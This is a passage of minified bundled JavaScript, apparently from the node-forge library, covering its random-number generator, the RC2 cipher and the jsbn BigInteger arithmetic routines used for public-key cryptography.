w(m){var x=m.data;x.forge&&x.forge.prng&&(self.removeEventListener("message",w),g(x.forge.prng.err,x.forge.prng.bytes))}self.addEventListener("message",w),self.postMessage({forge:{prng:{needed:p}}})};else{var f=function(p){var g=p.data;g.forge&&g.forge.prng&&n.seedFile(g.forge.prng.needed,function(w,m){h.postMessage({forge:{prng:{err:w,bytes:m}}})})};h.addEventListener("message",f)}},n},N_.exports}var DD;function Au(){if(DD)return D6.exports;DD=1;var r=Lr();return Xg(),hJ(),fJ(),Ei(),function(){if(r.random&&r.random.getBytes){D6.exports=r.random;return}(function(e){var t={},i=new Array(4),n=r.util.createBuffer();t.formatKey=function(h){var f=r.util.createBuffer(h);return h=new Array(4),h[0]=f.getInt32(),h[1]=f.getInt32(),h[2]=f.getInt32(),h[3]=f.getInt32(),r.aes._expandKey(h,!1)},t.formatSeed=function(h){var f=r.util.createBuffer(h);return h=new Array(4),h[0]=f.getInt32(),h[1]=f.getInt32(),h[2]=f.getInt32(),h[3]=f.getInt32(),h},t.cipher=function(h,f){return r.aes._updateBlock(h,f,i,!1),n.putInt32(i[0]),n.putInt32(i[1]),n.putInt32(i[2]),n.putInt32(i[3]),n.getBytes()},t.increment=function(h){return++h[3],h},t.md=r.md.sha256;function s(){var h=r.prng.create(t);return h.getBytes=function(f,p){return h.generate(f,p)},h.getBytesSync=function(f){return h.generate(f)},h}var o=s(),a=null,c=r.util.globalScope,l=c.crypto||c.msCrypto;if(l&&l.getRandomValues&&(a=function(h){return l.getRandomValues(h)}),r.options.usePureJavaScript||!r.util.isNodejs&&!a){if(o.collectInt(+new Date,32),typeof navigator<"u"){var u="";for(var d in navigator)try{typeof navigator[d]=="string"&&(u+=navigator[d])}catch{}o.collect(u),u=null}e&&(e().mousemove(function(h){o.collectInt(h.clientX,16),o.collectInt(h.clientY,16)}),e().keypress(function(h){o.collectInt(h.charCode,8)}))}if(!r.random)r.random=o;else for(var d in o)r.random[d]=o[d];r.random.createInstance=s,D6.exports=r.random})(typeof jQuery<"u"?jQuery:null)}(),D6.exports}var P_,LD;function pJ(){if(LD)return P_;LD=1;var r=Lr();Ei();var e=[217,120,249,196,25,221,181,237,40,233,253,121,74,160,216,157,198,126,55,131,43,118,83,142,98,76,100,136,68,139,251,162,23,154,89,245,135,179,79,19,97,69,109,141,9,129,125,50,189,143,64,235,134,183,123,11,240,149,33,34,92,107,78,130,84,214,101,147,206,96,178,28,115,86,192,20,167,140,241,220,18,117,202,31,59,190,228,209,66,61,212,48,163,60,182,38,111,191,14,218,70,105,7,87,39,242,29,155,188,148,67,3,248,17,199,246,144,239,62,231,6,195,213,47,200,102,30,215,8,232,234,222,128,82,238,247,132,170,114,172,53,77,106,42,150,26,210,113,90,21,73,116,75,159,208,94,4,24,164,236,194,224,65,110,15,81,203,204,36,145,175,80,161,244,112,57,153,124,58,133,35,184,180,122,252,2,54,91,37,85,151,49,45,93,250,152,227,138,146,174,5,223,41,16,103,108,186,201,211,0,230,207,225,158,168,44,99,22,1,63,88,226,137,169,13,56,52,27,171,51,255,176,187,72,12,95,185,177,205,46,197,243,219,71,229,165,156,119,10,166,32,104,254,127,193,173],t=[1,2,3,5],i=function(o,a){return o<<a&65535|(o&65535)>>16-a},n=function(o,a){return(o&65535)>>a|o<<16-a&65535};P_=r.rc2=r.rc2||{},r.rc2.expandKey=function(o,a){typeof o=="string"&&(o=r.util.createBuffer(o)),a=a||128;var c=o,l=o.length(),u=a,d=Math.ceil(u/8),h=255>>(u&7),f;for(f=l;f<128;f++)c.putByte(e[c.at(f-1)+c.at(f-l)&255]);for(c.setAt(128-d,e[c.at(128-d)&h]),f=127-d;f>=0;f--)c.setAt(f,e[c.at(f+1)^c.at(f+d)]);return c};var s=function(o,a,c){var l=!1,u=null,d=null,h=null,f,p,g,w,m=[];for(o=r.rc2.expandKey(o,a),g=0;g<64;g++)m.push(o.getInt16Le());c?(f=function(T){for(g=0;g<4;g++)T[g]+=m[w]+(T[(g+3)%4]&T[(g+2)%4])+(~T[(g+3)%4]&T[(g+1)%4]),T[g]=i(T[g],t[g]),w++},p=function(T){for(g=0;g<4;g++)T[g]+=m[T[(g+3)%4]&63]}):(f=function(T){for(g=3;g>=0;g--)T[g]=n(T[g],t[g]),T[g]-=m[w]+(T[(g+3)%4]&T[(g+2)%4])+(~T[(g+3)%4]&T[(g+1)%4]),w--},p=function(T){for(g=3;g>=0;g--)T[g]-=m[T[(g+3)%4]&63]});var x=function(T){var k=[];for(g=0;g<4;g++){var I=u.getInt16Le();h!==null&&(c?I^=h.getInt16Le():h.putInt16Le(I)),k.push(I&65535)}w=c?0:63;for(var E=0;E<T.length;E++)for(var C=0;C<T[E][0];C++)T[E][1](k);for(g=0;g<4;g++)h!==null&&(c?h.putInt16Le(k[g]):k[g]^=h.getInt16Le()),d.putInt16Le(k[g])},S=null;return S={start:function(T,k){T&&typeof T=="string"&&(T=r.util.createBuffer(T)),l=!1,u=r.util.createBuffer(),d=k||new r.util.createBuffer,h=T,S.output=d},update:function(T){for(l||u.putBuffer(T);u.length()>=8;)x([[5,f],[1,p],[6,f],[1,p],[5,f]])},finish:function(T){var k=!0;if(c)if(T)k=T(8,u,!c);else{var I=u.length()===8?8:8-u.length();u.fillWithByte(I,I)}if(k&&(l=!0,S.update()),!c&&(k=u.length()===0,k))if(T)k=T(8,d,!c);else{var E=d.length(),C=d.at(E-1);C>E?k=!1:d.truncate(C)}return k}},S};return r.rc2.startEncrypting=function(o,a,c){var l=r.rc2.createEncryptionCipher(o,128);return l.start(a,c),l},r.rc2.createEncryptionCipher=function(o,a){return s(o,a,!0)},r.rc2.startDecrypting=function(o,a,c){var l=r.rc2.createDecryptionCipher(o,128);return l.start(a,c),l},r.rc2.createDecryptionCipher=function(o,a){return s(o,a,!1)},P_}var $_,UD;function Yx(){if(UD)return $_;UD=1;var r=Lr();$_=r.jsbn=r.jsbn||{};var e;function t(X,ee,ce){this.data=[],X!=null&&(typeof X=="number"?this.fromNumber(X,ee,ce):ee==null&&typeof X!="string"?this.fromString(X,256):this.fromString(X,ee))}r.jsbn.BigInteger=t;function i(){return new t(null)}function n(X,ee,ce,ve,Oe,je){for(;--je>=0;){var bt=ee*this.data[X++]+ce.data[ve]+Oe;Oe=Math.floor(bt/67108864),ce.data[ve++]=bt&67108863}return Oe}function s(X,ee,ce,ve,Oe,je){for(var bt=ee&32767,lt=ee>>15;--je>=0;){var Ti=this.data[X]&32767,zn=this.data[X++]>>15,ia=lt*Ti+zn*bt;Ti=bt*Ti+((ia&32767)<<15)+ce.data[ve]+(Oe&1073741823),Oe=(Ti>>>30)+(ia>>>15)+lt*zn+(Oe>>>30),ce.data[ve++]=Ti&1073741823}return Oe}function o(X,ee,ce,ve,Oe,je){for(var bt=ee&16383,lt=ee>>14;--je>=0;){var Ti=this.data[X]&16383,zn=this.data[X++]>>14,ia=lt*Ti+zn*bt;Ti=bt*Ti+((ia&16383)<<14)+ce.data[ve]+Oe,Oe=(Ti>>28)+(ia>>14)+lt*zn,ce.data[ve++]=Ti&268435455}return Oe}typeof navigator>"u"?(t.prototype.am=o,e=28):navigator.appName=="Microsoft Internet Explorer"?(t.prototype.am=s,e=30):navigator.appName!="Netscape"?(t.prototype.am=n,e=26):(t.prototype.am=o,e=28),t.prototype.DB=e,t.prototype.DM=(1<<e)-1,t.prototype.DV=1<<e;var a=52;t.prototype.FV=Math.pow(2,a),t.prototype.F1=a-e,t.prototype.F2=2*e-a;var c="0123456789abcdefghijklmnopqrstuvwxyz",l=new Array,u,d;for(u=48,d=0;d<=9;++d)l[u++]=d;for(u=97,d=10;d<36;++d)l[u++]=d;for(u=65,d=10;d<36;++d)l[u++]=d;function h(X){return c.charAt(X)}function f(X,ee){var ce=l[X.charCodeAt(ee)];return ce??-1}function p(X){for(var ee=this.t-1;ee>=0;--ee)X.data[ee]=this.data[ee];X.t=this.t,X.s=this.s}function g(X){this.t=1,this.s=X<0?-1:0,X>0?this.data[0]=X:X<-1?this.data[0]=X+this.DV:this.t=0}function w(X){var ee=i();return ee.fromInt(X),ee}function m(X,ee){var ce;if(ee==16)ce=4;else if(ee==8)ce=3;else if(ee==256)ce=8;else if(ee==2)ce=1;else if(ee==32)ce=5;else if(ee==4)ce=2;else{this.fromRadix(X,ee);return}this.t=0,this.s=0;for(var ve=X.length,Oe=!1,je=0;--ve>=0;){var bt=ce==8?X[ve]&255:f(X,ve);if(bt<0){X.charAt(ve)=="-"&&(Oe=!0);continue}Oe=!1,je==0?this.data[this.t++]=bt:je+ce>this.DB?(this.data[this.t-1]|=(bt&(1<<this.DB-je)-1)<<je,this.data[this.t++]=bt>>this.DB-je):this.data[this.t-1]|=bt<<je,je+=ce,je>=this.DB&&(je-=this.DB)}ce==8&&(X[0]&128)!=0&&(this.s=-1,je>0&&(this.data[this.t-1]|=(1<<this.DB-je)-1<<je)),this.clamp(),Oe&&t.ZERO.subTo(this,this)}function x(){for(var X=this.s&this.DM;this.t>0&&this.data[this.t-1]==X;)--this.t}function S(X){if(this.s<0)return"-"+this.negate().toString(X);var ee;if(X==16)ee=4;else if(X==8)ee=3;else if(X==2)ee=1;else if(X==32)ee=5;else if(X==4)ee=2;else return this.toRadix(X);var ce=(1<<ee)-1,ve,Oe=!1,je="",bt=this.t,lt=this.DB-bt*this.DB%ee;if(bt-- >0)for(lt<this.DB&&(ve=this.data[bt]>>lt)>0&&(Oe=!0,je=h(ve));bt>=0;)lt<ee?(ve=(this.data[bt]&(1<<lt)-1)<<ee-lt,ve|=this.data[--bt]>>(lt+=this.DB-ee)):(ve=this.data[bt]>>(lt-=ee)&ce,lt<=0&&(lt+=this.DB,--bt)),ve>0&&(Oe=!0),Oe&&(je+=h(ve));return Oe?je:"0"}function T(){var X=i();return t.ZERO.subTo(this,X),X}function k(){return this.s<0?this.negate():this}function I(X){var ee=this.s-X.s;if(ee!=0)return ee;var ce=this.t;if(ee=ce-X.t,ee!=0)return this.s<0?-ee:ee;for(;--ce>=0;)if((ee=this.data[ce]-X.data[ce])!=0)return ee;return 0}function E(X){var ee=1,ce;return(ce=X>>>16)!=0&&(X=ce,ee+=16),(ce=X>>8)!=0&&(X=ce,ee+=8),(ce=X>>4)!=0&&(X=ce,ee+=4),(ce=X>>2)!=0&&(X=ce,ee+=2),(ce=X>>1)!=0&&(X=ce,ee+=1),ee}function C(){return this.t<=0?0:this.DB*(this.t-1)+E(this.data[this.t-1]^this.s&this.DM)}function N(X,ee){var ce;for(ce=this.t-1;ce>=0;--ce)ee.data[ce+X]=this.data[ce];for(ce=X-1;ce>=0;--ce)ee.data[ce]=0;ee.t=this.t+X,ee.s=this.s}function L(X,ee){for(var ce=X;ce<this.t;++ce)ee.data[ce-X]=this.data[ce];ee.t=Math.max(this.t-X,0),ee.s=this.s}function $(X,ee){var ce=X%this.DB,ve=this.DB-ce,Oe=(1<<ve)-1,je=Math.floor(X/this.DB),bt=this.s<<ce&this.DM,lt;for(lt=this.t-1;lt>=0;--lt)ee.data[lt+je+1]=this.data[lt]>>ve|bt,bt=(this.data[lt]&Oe)<<ce;for(lt=je-1;lt>=0;--lt)ee.data[lt]=0;ee.data[je]=bt,ee.t=this.t+je+1,ee.s=this.s,ee.clamp()}function y(X,ee){ee.s=this.s;var ce=Math.floor(X/this.DB);if(ce>=this.t){ee.t=0;return}var ve=X%this.DB,Oe=this.DB-ve,je=(1<<ve)-1;ee.data[0]=this.data[ce]>>ve;for(var bt=ce+1;bt<this.t;++bt)ee.data[bt-ce-1]|=(this.data[bt]&je)<<Oe,ee.data[bt-ce]=this.data[bt]>>ve;ve>0&&(ee.data[this.t-ce-1]|=(this.s&je)<<Oe),ee.t=this.t-ce,ee.clamp()}function A(X,ee){for(var ce=0,ve=0,Oe=Math.min(X.t,this.t);ce<Oe;)ve+=this.data[ce]-X.data[ce],ee.data[ce++]=ve&this.DM,ve>>=this.DB;if(X.t<this.t){for(ve-=X.s;ce<this.t;)ve+=this.data[ce],ee.data[ce++]=ve&this.DM,ve>>=this.DB;ve+=this.s}else{for(ve+=this.s;ce<X.t;)ve-=X.data[ce],ee.data[ce++]=ve&this.DM,ve>>=this.DB;ve-=X.s}ee.s=ve<0?-1:0,ve<-1?ee.data[ce++]=this.DV+ve:ve>0&&(ee.data[ce++]=ve),ee.t=ce,ee.clamp()}function b(X,ee){var ce=this.abs(),ve=X.abs(),Oe=ce.t;for(ee.t=Oe+ve.t;--Oe>=0;)ee.data[Oe]=0;for(Oe=0;Oe<ve.t;++Oe)ee.data[Oe+ce.t]=ce.am(0,ve.data[Oe],ee,Oe,0,ce.t);ee.s=0,ee.clamp(),this.s!=X.s&&t.ZERO.subTo(ee,ee)}function v(X){for(var ee=this.abs(),ce=X.t=2*ee.t;--ce>=0;)X.data[ce]=0;for(ce=0;ce<ee.t-1;++ce){var ve=ee.am(ce,ee.data[ce],X,2*ce,0,1);(X.data[ce+ee.t]+=ee.am(ce+1,2*ee.data[ce],X,2*ce+1,ve,ee.t-ce-1))>=ee.DV&&(X.data[ce+ee.t]-=ee.DV,X.data[ce+ee.t+1]=1)}X.t>0&&(X.data[X.t-1]+=ee.am(ce,ee.data[ce],X,2*ce,0,1)),X.s=0,X.clamp()}function _(X,ee,ce){var ve=X.abs();if(!(ve.t<=0)){var Oe=this.abs();if(Oe.t<ve.t){ee?.fromInt(0),ce!=null&&this.copyTo(ce);return}ce==null&&(ce=i());var je=i(),bt=this.s,lt=X.s,Ti=this.DB-E(ve.data[ve.t-1]);Ti>0?(ve.lShiftTo(Ti,je),Oe.lShiftTo(Ti,ce)):(ve.copyTo(je),Oe.copyTo(ce));var zn=je.t,ia=je.data[zn-1];if(ia!=0){var qo=ia*(1<<this.F1)+(zn>1?je.data[zn-2]>>this.F2:0),Ol=this.FV/qo,P2=(1<<this.F1)/qo,na=1<<this.F2,Wa=ce.t,$2=Wa-zn,Bl=ee??i();for(je.dlShiftTo($2,Bl),ce.compareTo(Bl)>=0&&(ce.data[ce.t++]=1,ce.subTo(Bl,ce)),t.ONE.dlShiftTo(zn,Bl),Bl.subTo(je,je);je.t<zn;)je.data[je.t++]=0;for(;--$2>=0;){var q0=ce.data[--Wa]==ia?this.DM:Math.floor(ce.data[Wa]*Ol+(ce.data[Wa-1]+na)*P2);if((ce.data[Wa]+=je.am(0,q0,ce,$2,0,zn))<q0)for(je.dlShiftTo($2,Bl),ce.subTo(Bl,ce);ce.data[Wa]<--q0;)ce.subTo(Bl,ce)}ee!=null&&(ce.drShiftTo(zn,ee),bt!=lt&&t.ZERO.subTo(ee,ee)),ce.t=zn,ce.clamp(),Ti>0&&ce.rShiftTo(Ti,ce),bt<0&&t.ZERO.subTo(ce,ce)}}}function O(X){var ee=i();return this.abs().divRemTo(X,null,ee),this.s<0&&ee.compareTo(t.ZERO)>0&&X.subTo(ee,ee),ee}function D(X){this.m=X}function R(X){return X.s<0||X.compareTo(this.m)>=0?X.mod(this.m):X}function P(X){return X}function B(X){X.divRemTo(this.m,null,X)}function M(X,ee,ce){X.multiplyTo(ee,ce),this.reduce(ce)}function W(X,ee){X.squareTo(ee),this.reduce(ee)}D.prototype.convert=R,D.prototype.revert=P,D.prototype.reduce=B,D.prototype.mulTo=M,D.prototype.sqrTo=W;function K(){if(this.t<1)return 0;var X=this.data[0];if((X&1)==0)return 0;var ee=X&3;return ee=ee*(2-(X&15)*ee)&15,ee=ee*(2-(X&255)*ee)&255,ee=ee*(2-((X&65535)*ee&65535))&65535,ee=ee*(2-X*ee%this.DV)%this.DV,ee>0?this.DV-ee:-ee}function q(X){this.m=X,this.mp=X.invDigit(),this.mpl=this.mp&32767,this.mph=this.mp>>15,this.um=(1<<X.DB-15)-1,this.mt2=2*X.t}function J(X){var ee=i();return X.abs().dlShiftTo(this.m.t,ee),ee.divRemTo(this.m,null,ee),X.s<0&&ee.compareTo(t.ZERO)>0&&this.m.subTo(ee,ee),ee}function le(X){var ee=i();return X.copyTo(ee),this.reduce(ee),ee}function ae(X){for(;X.t<=this.mt2;)X.data[X.t++]=0;for(var ee=0;ee<this.m.t;++ee){var ce=X.data[ee]&32767,ve=ce*this.mpl+((ce*this.mph+(X.data[ee]>>15)*this.mpl&this.um)<<15)&X.DM;for(ce=ee+this.m.t,X.data[ce]+=this.m.am(0,ve,X,ee,0,this.m.t);X.data[ce]>=X.DV;)X.data[ce]-=X.DV,X.data[++ce]++}X.clamp(),X.drShiftTo(this.m.t,X),X.compareTo(this.m)>=0&&X.subTo(this.m,X)}function U(X,ee){X.squareTo(ee),this.reduce(ee)}function G(X,ee,ce){X.multiplyTo(ee,ce),this.reduce(ce)}q.prototype.convert=J,q.prototype.revert=le,q.prototype.reduce=ae,q.prototype.mulTo=G,q.prototype.sqrTo=U;function Z(){return(this.t>0?this.data[0]&1:this.s)==0}function j(X,ee){if(X>4294967295||X<1)return t.ONE;var ce=i(),ve=i(),Oe=ee.convert(this),je=E(X)-1;for(Oe.copyTo(ce);--je>=0;)if(ee.sqrTo(ce,ve),(X&1<<je)>0)ee.mulTo(ve,Oe,ce);else{var bt=ce;ce=ve,ve=bt}return ee.revert(ce)}function Y(X,ee){var ce;return X<256||ee.isEven()?ce=new D(ee):ce=new q(ee),this.exp(X,ce)}t.prototype.copyTo=p,t.prototype.fromInt=g,t.prototype.fromString=m,t.prototype.clamp=x,t.prototype.dlShiftTo=N,t.prototype.drShiftTo=L,t.prototype.lShiftTo=$,t.prototype.rShiftTo=y,t.prototype.subTo=A,t.prototype.multiplyTo=b,t.prototype.squareTo=v,t.prototype.divRemTo=_,t.prototype.invDigit=K,t.prototype.isEven=Z,t.prototype.exp=j,t.prototype.toString=S,t.prototype.negate=T,t.prototype.abs=k,t.prototype.compareTo=I,t.prototype.bitLength=C,t.prototype.mod=O,t.prototype.modPowInt=Y,t.ZERO=w(0),t.ONE=w(1);function se(){var X=i();return this.copyTo(X),X}function ne(){if(this.s<0){if(this.t==1)return this.data[0]-this.DV;if(this.t==0)return-1}else{if(this.t==1)return this.data[0];if(this.t==0)return 0}return(this.data[1]&(1<<32-this.DB)-1)<<this.DB|this.data[0]}function Te(){return this.t==0?this.s:this.data[0]<<24>>24}function Re(){return this.t==0?this.s:this.data[0]<<16>>16}function $e(X){return Math.floor(Math.LN2*this.DB/Math.log(X))}function Ae(){return this.s<0?-1:this.t<=0||this.t==1&&this.data[0]<=0?0:1}function De(X){if(X==null&&(X=10),this.signum()==0||X<2||X>36)return"0";var ee=this.chunkSize(X),ce=Math.pow(X,ee),ve=w(ce),Oe=i(),je=i(),bt="";for(this.divRemTo(ve,Oe,je);Oe.signum()>0;)bt=(ce+je.intValue()).toString(X).substr(1)+bt,Oe.divRemTo(ve,Oe,je);return je.intValue().toString(X)+bt}function Le(X,ee){this.fromInt(0),ee==null&&(ee=10);for(var ce=this.chunkSize(ee),ve=Math.pow(ee,ce),Oe=!1,je=0,bt=0,lt=0;lt<X.length;++lt){var Ti=f(X,lt);if(Ti<0){X.charAt(lt)=="-"&&this.signum()==0&&(Oe=!0);continue}bt=ee*bt+Ti,++je>=ce&&(this.dMultiply(ve),this.dAddOffset(bt,0),je=0,bt=0)}je>0&&(this.dMultiply(Math.pow(ee,je)),this.dAddOffset(bt,0)),Oe&&t.ZERO.subTo(this,this)}function it(X,ee,ce){if(typeof ee=="number")if(X<2)this.fromInt(1);else for(this.fromNumber(X,ce),this.testBit(X-1)||this.bitwiseTo(t.ONE.shiftLeft(X-1),ie,this),this.isEven()&&this.dAddOffset(1,0);!this.isProbablePrime(ee);)this.dAddOffset(2,0),this.bitLength()>X&&this.subTo(t.ONE.shiftLeft(X-1),this);else{var ve=new Array,Oe=X&7;ve.length=(X>>3)+1,ee.nextBytes(ve),Oe>0?ve[0]&=(1<<Oe)-1:ve[0]=0,this.fromString(ve,256)}}function nt(){var X=this.t,ee=new Array;ee[0]=this.s;var ce=this.DB-X*this.DB%8,ve,Oe=0;if(X-- >0)for(ce<this.DB&&(ve=this.data[X]>>ce)!=(this.s&this.DM)>>ce&&(ee[Oe++]=ve|this.s<<this.DB-ce);X>=0;)ce<8?(ve=(this.data[X]&(1<<ce)-1)<<8-ce,ve|=this.data[--X]>>(ce+=this.DB-8)):(ve=this.data[X]>>(ce-=8)&255,ce<=0&&(ce+=this.DB,--X)),(ve&128)!=0&&(ve|=-256),Oe==0&&(this.s&128)!=(ve&128)&&++Oe,(Oe>0||ve!=this.s)&&(ee[Oe++]=ve);return ee}function ct(X){return this.compareTo(X)==0}function St(X){return this.compareTo(X)<0?this:X}function zt(X){return this.compareTo(X)>0?this:X}function Q(X,ee,ce){var ve,Oe,je=Math.min(X.t,this.t);for(ve=0;ve<je;++ve)ce.data[ve]=ee(this.data[ve],X.data[ve]);if(X.t<this.t){for(Oe=X.s&this.DM,ve=je;ve<this.t;++ve)ce.data[ve]=ee(this.data[ve],Oe);ce.t=this.t}else{for(Oe=this.s&this.DM,ve=je;ve<X.t;++ve)ce.data[ve]=ee(Oe,X.data[ve]);ce.t=X.t}ce.s=ee(this.s,X.s),ce.clamp()}function z(X,ee){return X&ee}function H(X){var ee=i();return this.bitwiseTo(X,z,ee),ee}function ie(X,ee){return X|ee}function pe(X){var ee=i();return this.bitwiseTo(X,ie,ee),ee}function we(X,ee){return X^ee}function _e(X){var ee=i();return this.bitwiseTo(X,we,ee),ee}function et(X,ee){return X&~ee}function yt(X){var ee=i();return this.bitwiseTo(X,et,ee),ee}function Ye(){for(var X=i(),ee=0;ee<this.t;++ee)X.data[ee]=this.DM&~this.data[ee];return X.t=this.t,X.s=~this.s,X}function $t(X){var ee=i();return X<0?this.rShiftTo(-X,ee):this.lShiftTo(X,ee),ee}function xt(X){var ee=i();return X<0?this.lShiftTo(-X,ee):this.rShiftTo(X,ee),ee}function Mt(X){if(X==0)return-1;var ee=0;return(X&65535)==0&&(X>>=16,ee+=16),(X&255)==0&&(X>>=8,ee+=8),(X&15)==0&&(X>>=4,ee+=4),(X&3)==0&&(X>>=2,ee+=2),(X&1)==0&&++ee,ee}function Pr(){for(var X=0;X<this.t;++X)if(this.data[X]!=0)return X*this.DB+Mt(this.data[X]);return this.s<0?this.t*this.DB:-1}function Ur(X){for(var ee=0;X!=0;)X&=X-1,++ee;return ee}function Vt(){for(var X=0,ee=this.s&this.DM,ce=0;ce<this.t;++ce)X+=Ur(this.data[ce]^ee);return X}function jr(X){var ee=Math.floor(X/this.DB);return ee>=this.t?this.s!=0:(this.data[ee]&1<<X%this.DB)!=0}function Br(X,ee){var ce=t.ONE.shiftLeft(X);return this.bitwiseTo(ce,ee,ce),ce}function Ct(X){return this.changeBit(X,ie)}function er(X){return this.changeBit(X,et)}function tr(X){return this.changeBit(X,we)}function mt(X,ee){for(var ce=0,ve=0,Oe=Math.min(X.t,this.t);ce<Oe;)ve+=this.data[ce]+X.data[ce],ee.data[ce++]=ve&this.DM,ve>>=this.DB;if(X.t<this.t){for(ve+=X.s;ce<this.t;)ve+=this.data[ce],ee.data[ce++]=ve&this.DM,ve>>=this.DB;ve+=this.s}else{for(ve+=this.s;ce<X.t;)ve+=X.data[ce],ee.data[ce++]=ve&this.DM,ve>>=this.DB;ve+=X.s}ee.s=ve<0?-1:0,ve>0?ee.data[ce++]=ve:ve<-1&&(ee.data[ce++]=this.DV+ve),ee.t=ce,ee.clamp()}function or(X){var ee=i();return this.addTo(X,ee),ee}function ar(X){var ee=i();return this.subTo(X,ee),ee}function It(X){var ee=i();return this.multiplyTo(X,ee),ee}function cr(X){var ee=i();return this.divRemTo(X,ee,null),ee}function lr(X){var ee=i();return this.divRemTo(X,null,ee),ee}function At(X){var ee=i(),ce=i();return this.divRemTo(X,ee,ce),new Array(ee,ce)}function rr(X){this.data[this.t]=this.am(0,X-1,this,0,0,this.t),++this.t,this.clamp()}function Kt(X,ee){if(X!=0){for(;this.t<=ee;)this.data[this.t++]=0;for(this.data[ee]+=X;this.data[ee]>=this.DV;)this.data[ee]-=this.DV,++ee>=this.t&&(this.data[this.t++]=0),++this.data[ee]}}function wt(){}function ir(X){return X}function ur(X,ee,ce){X.multiplyTo(ee,ce)}function Tt(X,ee){X.squareTo(ee)}wt.prototype.convert=ir,wt.prototype.revert=ir,wt.prototype.mulTo=ur,wt.prototype.sqrTo=Tt;function ui(X){return this.exp(X,new wt)}function Ar(X,ee,ce){var ve=Math.min(this.t+X.t,ee);for(ce.s=0,ce.t=ve;ve>0;)ce.data[--ve]=0;var Oe;for(Oe=ce.t-this.t;ve<Oe;++ve)ce.data[ve+this.t]=this.am(0,X.data[ve],ce,ve,0,this.t);for(Oe=Math.min(X.t,ee);ve<Oe;++ve)this.am(0,X.data[ve],ce,ve,0,ee-ve);ce.clamp()}function ri(X,ee,ce){--ee;var ve=ce.t=this.t+X.t-ee;for(ce.s=0;--ve>=0;)ce.data[ve]=0;for(ve=Math.max(ee-this.t,0);ve<X.t;++ve)ce.data[this.t+ve-ee]=this.am(ee-ve,X.data[ve],ce,0,0,this.t+ve-ee);ce.clamp(),ce.drShiftTo(1,ce)}function qn(X){this.r2=i(),this.q3=i(),t.ONE.dlShiftTo(2*X.t,this.r2),this.mu=this.r2.divide(X),this.m=X}function yo(X){if(X.s<0||X.t>2*this.m.t)return X.mod(this.m);if(X.compareTo(this.m)<0)return X;var ee=i();return X.copyTo(ee),this.reduce(ee),ee}function xo(X){return X}function Co(X){for(X.drShiftTo(this.m.t-1,this.r2),X.t>this.m.t+1&&(X.t=this.m.t+1,X.clamp()),this.mu.multiplyUpperTo(this.r2,this.m.t+1,this.q3),this.m.multiplyLowerTo(this.q3,this.m.t+1,this.r2);X.compareTo(this.r2)<0;)X.dAddOffset(1,this.m.t+1);for(X.subTo(this.r2,X);X.compareTo(this.m)>=0;)X.subTo(this.m,X)}function Rn(X,ee){X.squareTo(ee),this.reduce(ee)}function Al(X,ee,ce){X.multiplyTo(ee,ce),this.reduce(ce)}qn.prototype.convert=yo,qn.prototype.revert=xo,qn.prototype.reduce=Co,qn.prototype.mulTo=Al,qn.prototype.sqrTo=Rn;function Il(X,ee){var ce=X.bitLength(),ve,Oe=w(1),je;if(ce<=0)return Oe;ce<18?ve=1:ce<48?ve=3:ce<144?ve=4:ce<768?ve=5:ve=6,ce<8?je=new D(ee):ee.isEven()?je=new qn(ee):je=new q(ee);var bt=new Array,lt=3,Ti=ve-1,zn=(1<<ve)-1;if(bt[1]=je.convert(this),ve>1){var ia=i();for(je.sqrTo(bt[1],ia);lt<=zn;)bt[lt]=i(),je.mulTo(ia,bt[lt-2],bt[lt]),lt+=2}var qo=X.t-1,Ol,P2=!0,na=i(),Wa;for(ce=E(X.data[qo])-1;qo>=0;){for(ce>=Ti?Ol=X.data[qo]>>ce-Ti&zn:(Ol=(X.data[qo]&(1<<ce+1)-1)<<Ti-ce,qo>0&&(Ol|=X.data[qo-1]>>this.DB+ce-Ti)),lt=ve;(Ol&1)==0;)Ol>>=1,--lt;if((ce-=lt)<0&&(ce+=this.DB,--qo),P2)bt[Ol].copyTo(Oe),P2=!1;else{for(;lt>1;)je.sqrTo(Oe,na),je.sqrTo(na,Oe),lt-=2;lt>0?je.sqrTo(Oe,na):(Wa=Oe,Oe=na,na=Wa),je.mulTo(na,bt[Ol],Oe)}for(;qo>=0&&(X.data[qo]&1<<ce)==0;)je.sqrTo(Oe,na),Wa=Oe,Oe=na,na=Wa,--ce<0&&(ce=this.DB-1,--qo)}return je.revert(Oe)}function Tl(X){var ee=this.s<0?this.negate():this.clone(),ce=X.s<0?X.negate():X.clone();if(ee.compareTo(ce)<0){var ve=ee;ee=ce,ce=ve}var Oe=ee.getLowestSetBit(),je=ce.getLowestSetBit();if(je<0)return ee;for(Oe<je&&(je=Oe),je>0&&(ee.rShiftTo(je,ee),ce.rShiftTo(je,ce));ee.signum()>0;)(Oe=ee.getLowestSetBit())>0&&ee.rShiftTo(Oe,ee),(Oe=ce.getLowestSetBit())>0&&ce.rShiftTo(Oe,ce),ee.compareTo(ce)>=0?(ee.subTo(ce,ee),ee.rShiftTo(1,ee)):(ce.subTo(ee,ce),ce.rShiftTo(1,ce));return je>0&&ce.lShiftTo(je,ce),ce}function kl(X){if(X<=0)return 0;var ee=this.DV%X,ce=this.s<0?X-1:0;if(this.t>0)if(ee==0)ce=this.data[0]%X;else for(var ve=this.t-1;ve>=0;--ve)ce=(ee*ce+this.data[ve])%X;return ce}function Nl(X){var ee=X.isEven();if(this.isEven()&&ee||X.signum()==0)return t.ZERO;for(var ce=X.clone(),ve=this.clone(),Oe=w(1),je=w(0),bt=w(0),lt=w(1);ce.signum()!=0;){for(;ce.isEven();)ce.rShiftTo(1,ce),ee?((!Oe.isEven()||!je.isEven())&&(Oe.addTo(this,Oe),je.subTo(X,je)),Oe.rShiftTo(1,Oe)):je.isEven()||je.subTo(X,je),je.rShiftTo(1,je);for(;ve.isEven();)ve.rShiftTo(1,ve),ee?((!bt.isEven()||!lt.isEven())&&(bt.addTo(this,bt),lt.subTo(X,lt)),bt.rShiftTo(1,bt)):lt.isEven()||lt.subTo(X,lt),lt.rShiftTo(1,lt);ce.compareTo(ve)>=0?(ce.subTo(ve,ce),ee&&Oe.subTo(bt,Oe),je.subTo(lt,je)):(ve.subTo(ce,ve),ee&&bt.subTo(Oe,bt),lt.subTo(je,lt))}if(ve.compareTo(t.ONE)!=0)return t.ZERO;if(lt.compareTo(X)>=0)return lt.subtract(X);if(lt.signum()<0)lt.addTo(X,lt);else return lt;return lt.signum()<0?lt.add(X):lt}var 